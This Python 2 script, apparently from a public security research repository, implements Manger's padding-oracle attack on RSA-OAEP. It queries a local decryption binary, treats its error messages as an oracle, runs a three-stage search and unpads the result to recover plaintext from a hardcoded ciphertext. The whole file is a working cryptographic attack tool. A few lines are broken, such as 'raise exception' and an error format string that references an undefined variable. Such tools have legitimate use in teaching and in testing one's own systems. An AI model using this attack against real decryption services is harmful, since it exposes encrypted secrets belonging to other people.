#!/usr/bin/python
#Source: https://github.com/GDSSecurity/mangers-oracle

import math, os, sys
from time import time
from optparse import OptionParser
from fractions import gcd
from decimal import *
from subprocess import Popen, PIPE
from hashlib import sha1
from Crypto.Util.number import long_to_bytes
import binascii

def _strxor(s1, s2):
  # Not mine.  From hmac.py
  return "".join(map(lambda x, y: chr(ord(x) ^ ord(y)), s1, s2))

def modpow(base, exponent, modulus):
  result = 1
  while exponent > 0:
    if exponent & 1 == 1:
      result = (result * base) % modulus
    exponent = exponent >> 1
    base = (base * base) % modulus
  return result

def pprint(n, places=20):
  n = str(int(n))
  if len(n) > places:
    return "%s...(%u)" % (n[0:places], len(n))
  else:
    return n

class MangersOracle(object):

  def __init__(self, n, e, options, cheatingPlaintext=None):
    self.n = n
    self.e = e
    self.c = None
    self.options = options
    self.cheatingPlaintext = cheatingPlaintext
    return

  def f_to_str(self, f):
    half = modpow(f, self.e, self.n)
    whole = (half * self.c) % self.n
    return hex(whole)[2:-1]

  def ask_oracle(self, f):
    s = self.f_to_str(f)
    return self.oracle(s)

  def oracle(self):
    raise NotImplemented('oracle() must be implemented by parent class')

  def verbose(self, m):
    if self.options.verbose:
      print m
    return

  def cheat(self, m):
    if self.options.verbose and self.options.cheat:
      print m
    return

  def stage1(self, k, B):

    for i in range(1, 130):
      f1 = pow(2, i)
      self.verbose("\tf1= %s" % pprint(f1))
      self.cheat("\t\tf1*m= %s" % pprint(f1 * self.cheatingPlaintext))

      gt = self.ask_oracle(f1)

      if gt:
        self.verbose("\t\tf1*m E [B, 2B): %s - %s" % (pprint(B), pprint(2 * B)))
        break

      self.verbose("\t\tf1*m E [0, B): 0 - %s" % pprint(B))

    return f1

  def stage2(self, k, B, f1):

    f2 = int(math.floor((self.n + B) / B) * (f1 / 2))

    self.verbose("\tf2= %s" % pprint(f2))
    self.cheat("\t\tf2*m= %s" % pprint(f2* self.cheatingPlaintext))
    self.verbose("\t\tf2*m E [n/2, n+B): %s - %s" % (pprint(self.n / 2), pprint(self.n + B)))

    iterations = 0
    gt = self.ask_oracle(f2)
    while gt and iterations < k:
      f2 = f2 + (f1 / 2)

      self.verbose("\tf2= %s" % pprint(f2))
      self.cheat("\t\tf2*m= %s" % pprint(f2 * self.cheatingPlaintext))

      gt = self.ask_oracle(f2)

      if gt:
        self.verbose("\t\tf2*m E [n/2, n): %s - %s" % (pprint(self.n / 2), pprint(self.n)))
      else:
        self.verbose("\t\tStopping...")
        self.verbose("\t\tf2*m E [n, n+B): %s - %s" % (pprint(self.n), pprint(self.n + B)))

      iterations += 1

    if gt:
      raise Exception("Stopped phase 2 after %u iterations - something's wrong" % (iterations, ))

    return f2

  # The numbers we work with in this stage are so large we have to switch to the
  #  Decimal class and up the precision considerably.  This precision actually
  #  isn't enough for numbers we generate towards the end (in i*n) but it works
  #  anyway.
  def stage3(self, k, Bd, f2):

    getcontext().prec=350
    mmin = Decimal(self.n / f2).to_integral_value(rounding = ROUND_CEILING)
    mmax = Decimal((self.n + Bd) / f2).to_integral_value(rounding = ROUND_FLOOR)

    f3 = f2
    oldf3 = -1
    iterations = 0
    iteratestop = 3500
    difference1 = difference2 = 1

    print("Beginning phase 3...")
    while oldf3 != f3 and mmin < mmax and iterations < iteratestop and (not self.options.cheat or (difference1 > 0 and difference2 > 0)):
      ftmp = Decimal((2 * Bd) / (mmax - mmin)).to_integral_value(rounding=ROUND_FLOOR)
      i =  Decimal(ftmp * mmin / self.n).to_integral_value(rounding=ROUND_CEILING)
      oldf3 = f3
      f3 = Decimal((i * self.n) / mmin).to_integral_value(rounding=ROUND_CEILING)

      if self.options.cheat:
        difference1 = mmax - self.cheatingPlaintext
        difference2 = self.cheatingPlaintext - mmin
      difference = float(mmax - mmin)

      if not self.options.verbose:
        sys.stdout.write("Difference: %f               \r" % (difference, ))
      else:
        self.cheat("\tmmin to p= %s" % pprint(difference2))
        self.cheat("\tpd to mmax= %s" % pprint(difference1))

        if not self.options.cheat:
          print("\tmmax to mmax= %s" % pprint(difference))

        print("\tmmin= %s" % pprint(mmin))
        print("\tmmax= %s" % pprint(mmax))
        print("")
        print("\ti= %s" % pprint(i))
        print("\tf3= %s" % pprint(f3))
        #self.cheat("\tf3*m= %s", pprint(f3 * self.cheatingPlaintext))
        print("\tf3*m E [in, in+2B): %s - %s" % (pprint(i * self.n), pprint(i * self.n + 2 * Bd)))

      if f3 == 0:
        break

      gt = self.ask_oracle(int(f3))
      if gt:
        mmin = Decimal((i * self.n + Bd) / f3).to_integral_value(rounding=ROUND_CEILING)
        self.verbose("\tGreater: new mmin.")
        self.verbose("\tf3*m E [in +B, in +2B): %s - %s" % (pprint(i * self.n + Bd), pprint(i * self.n + 2 * Bd)))
      else:
        mmax = Decimal((i * self.n + Bd) / f3).to_integral_value(rounding=ROUND_FLOOR)
        self.verbose("\tLess: new mmax.")
        self.verbose("\tf3*m E [in, in + B): %s - %s" % (pprint(i * self.n), pprint(i * self.n + Bd)))

      iterations += 1

    if iterations >= iteratestop:
      raise Exception("Stopped phase 3 after %u iterations - something's wrong" % iterations)
    elif f3 == 0:
      raise Exception("F3 was zero, something's wrong")
    elif mmin > mmax:
      print("\tmmin %s" % pprint(mmin))
      print("\tmmax %s" % pprint(mmax))
      raise Exception("mmin > mmax, at %u iterations - something's wrong" % iterations)
    elif self.options.cheat and difference1 < 0 or difference2 < 0:
      raise Exception("plaintext no longer fits between the range.")

    return mmin

  ################################################################################
  # Code from https://bugs.launchpad.net/pycrypto/+bug/328027 by Ryan Kelly

  def MFG(self, mgfSeed, maskLen, hashFunction):
    maskLen = int(maskLen)
    hLen = hashFunction().digest_size
    if maskLen > 2**32 * hLen:
      raise ValueError("mask too long")
    T = ""
    for counter in range(int(math.ceil(maskLen / (hLen*1.0)))):
      C = long_to_bytes(counter)
      C = ('\x00'*(4 - len(C))) + C
      assert len(C) == 4, "counter was too big"
      T += hashFunction(mgfSeed + C).digest()
    assert len(T) >= maskLen, "generated mask was too short"
    return T[:maskLen]

  # We assume/hope they used the sha-1 hash function, although it's possible to
  # use others.
  def unpad(self, k, foundPlaintext):
    hashFunction = sha1

    label = "" # We hope they didn't use a label, but it's not unusable if they did
    lHash = hashFunction(label).digest()
    hLen = len(lHash)

    plaintextBytes = ""
    destruction = int(foundPlaintext)
    while destruction > 0:
      plaintextBytes = chr(destruction % 256) + plaintextBytes
      destruction = destruction >> 8

    maskedSeed = plaintextBytes[ : hLen]
    maskedDB = plaintextBytes[hLen : ]

    seedMask = self.MFG(maskedDB, hLen, hashFunction)
    seed = _strxor(maskedSeed, seedMask)
    dbMask = self.MFG(seed, k - hLen - 1, hashFunction)
    DB = _strxor(maskedDB, dbMask)

    lHash1 = DB[:hLen]
    x01pos = hLen
    while x01pos < len(DB) and DB[x01pos] != "\x01":
      x01pos += 1
    PS = DB[hLen:x01pos]
    M = DB[x01pos+1:]

    if x01pos == len(DB):
      # No \x01 byte
      raise Exception("Something's wrong, the 0x01 byte was not present.")

    if lHash1 != lHash:
      # Mismatched label hash
      print "It appears they used a non-blank label.  This shouldn't matter..."

    return M

  def run(self, c):
    self.c = c

    k = Decimal(str(math.log(self.n, 256))).to_integral_value(rounding=ROUND_CEILING)
    #k = math.ceil(math.log(self.n, 256))
    B = getcontext().power(Decimal(2), Decimal(8*(k-1)))
    #B = pow(2, 8*(k-1))
    #Bd = Decimal(str(B))

    if 2 * B >= self.n:
      raise exception("Obscure, unhandled case: 2B >= n")

    self.verbose("k = %s" % k)
    self.verbose("B = %s" % pprint(B))
    self.verbose("n = %s" % pprint(self.n))

    f1 = self.stage1(k, B)
    print("Finished Stage 1 with a f1 of %s" % f1)
    f2 = self.stage2(k, B, f1)
    print("Finished Stage 2 with a f2 of %s" % f2)
    foundPlaintext = self.stage3(k, B, f2)
    print("Finished Stage 3...")
    print("Now performing OAEP Unpadding on plaintext...")

    self.verbose(pprint(foundPlaintext))

    recoveredPlaintext = self.unpad(k, foundPlaintext)
    print("The plaintext, in hexadecimal:")
    print("0x%s" % binascii.hexlify(recoveredPlaintext))
    #for b in recoveredPlaintext:
    # sys.stdout.write(hex(ord(b))[2:].rjust(2, '0'))

    return

class TestOracle(MangersOracle):

  def oracle(self, s):

    p = Popen(["./decrypt", s], stdout=PIPE)
    line = p.communicate()[0]

    if 'Missing item in object' in line:
      # Integer to Octets Failure (e.g. frame[0] or Invalid Obj) indicates y >= B
      return True

    if 'Encoding problem' in line:
      # Encoding Error indicates y < B
      return False

    raise Exception("Unexpected response: " % (output, ))

if __name__ == "__main__":

  parser = OptionParser()
  parser.add_option("-v", "--verbose", dest="verbose", action="store_true")
  parser.add_option("-c", "--cheat", dest="cheat", action="store_true")
  (options, args) = parser.parse_args()

  n = 157864837766412470414898605682479126709913814457720048403886101369805832566211909035448137352055018381169566146003377316475222611235116218157405481257064897859932106980034542393008803178451117972197473517842606346821132572405276305083616404614783032204836434549683833460267309649602683257403191134393810723409
  e = 65537
  c = int('5033692c41c8a1bdc2c78eadffc47da73470b2d25c9dc0ce2c0d0282f0d5f845163ab6f2f296540c1a1090d826648e12644945ab922a125bb9c67f8caaef6b4abe06b92d3365075fbb5d8f19574ddb5ee80c0166303702bbba249851836a58c3baf23f895f9a16e5b15f2a698be1e3efb74d5c5c4fddc188835a16cf7c9c132c', 16)
  p = '1' #int('2ea4875381beb0f84818ce1c4df72574f194f7abefe9601b21da092f484fa886ff0de66edf8babd4bd5b35dfdb0e642382947270a8f197e3cbaaa37cb8f7007f4604794a51c3bd65f8d17bfad9e699726ff9f61b99762d130777872eb4e9f1532cf3bfbfc3d2ad5d8d4582cc90a2e59915c462967b19965f77225447ce660d', 16)

  m = TestOracle(n, e, options, cheatingPlaintext=p)
  m.run(c)

